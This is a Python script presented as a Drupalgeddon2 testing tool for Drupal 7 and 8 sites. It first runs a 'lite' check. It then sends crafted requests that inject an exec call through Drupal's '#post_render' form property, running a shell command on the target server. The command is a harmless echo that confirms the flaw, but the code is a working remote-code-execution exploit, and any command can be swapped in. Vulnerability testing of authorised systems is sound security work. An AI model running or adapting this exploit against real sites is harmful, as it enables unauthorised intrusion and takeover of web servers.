import requests
import random
import string
import sys
import argparse
import base64
import urllib

from bs4 import BeautifulSoup


requests.packages.urllib3.disable_warnings()


def get_random_string(len=20):
    return ''.join([random.choice(string.ascii_letters) for _ in range(len)])


def check_lite(base_url, proxy):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    url = base_url + '/user/password?name[%23a]=test&name[%23b]=lite'

    resp = requests.get(url, headers=headers, proxies=proxy, verify=False)

    if resp.status_code != 200:
        return False

    soup = BeautifulSoup(resp.content, 'lxml')
    name_value = soup.find('input', {'id': 'edit-name'}).get('value')

    if name_value == 'test lite':
        return True

    return False


def check_vulnerable_8(base_url, proxy):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    r = get_random_string()
    cmd = urllib.quote('echo {0} | base64 -d'.format(base64.b64encode(r)))
    url = base_url + '/user/register?element_parents=timezone/timezone/%23value&ajax_form=1'
    data = 'form_id=user_register_form&_drupal_ajax=1&timezone[#post_render][]=exec&timezone[#markup]={0}'.format(cmd)

    resp = requests.post(url, data, headers=headers, proxies=proxy, verify=False)

    if r in str(resp.content):
        return True

    return False


def check_vulnerable_7(base_url, proxy):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    r = get_random_string()
    cmd = urllib.quote('echo {0} | base64 -d'.format(base64.b64encode(r)))
    url = base_url + '/user/password?name[%23post_render][0]=exec&name[%23markup]={0}'.format(cmd)
    data = 'form_build_id=&form_id=user_pass&_triggering_element_name=name&_triggering_element_value='

    resp = requests.post(url, data, headers=headers, proxies=proxy, verify=False)

    if resp.status_code != 200:
        return False

    soup = BeautifulSoup(resp.content, 'lxml')
    form_build_id = soup.find('input', {'name': 'form_build_id'}).get('value')

    url = base_url + '/file/ajax/name/%23value/' + form_build_id
    data = 'form_build_id={0}'.format(form_build_id)

    resp = requests.post(url, data, headers=headers, proxies=proxy, verify=False)

    if r in str(resp.content):
        return True

    return False


def main():
    parser = argparse.ArgumentParser(description='Drupalgeddon2 testing tool, works for Drupal 7/8.')

    parser.add_argument('--url', help='base url with Drupal installation')
    parser.add_argument('--lite', help='lite check without exploitation attempt', action='store_true')
    parser.add_argument('--proxy', help='http and https proxy')

    args = parser.parse_args(sys.argv[1:])

    if not args.url:
        parser.print_help()
        return

    proxy = {}
    if args.proxy:
        proxy = {'http': args.proxy, 'https': args.proxy}

    vulnerable = check_lite(args.url, proxy)

    if not vulnerable:
        print('[-] Target {0} seems not vulnerable to Drupalgeddon 2.'.format(args.url))
        return

    if args.lite:
        if vulnerable:
            print('[+] Lite check shows that target `{0}` is vulnerable bingo!!!'.format(args.url))

        return

    vulnerable1 = check_vulnerable_7(args.url, proxy)
    vulnerable2 = check_vulnerable_8(args.url, proxy)

    if vulnerable1:
        print('[*] Drupal 7 target `{0}` is vulnerable bingo!!!'.format(args.url))
    elif vulnerable2:
        print('[*] Drupal 8 target `{0}` is vulnerable bingo!!!'.format(args.url))
    else:
        print('[-] Target {0} seems not vulnerable to Drupalgeddon 2.'.format(args.url))


if __name__ == '__main__':
    main()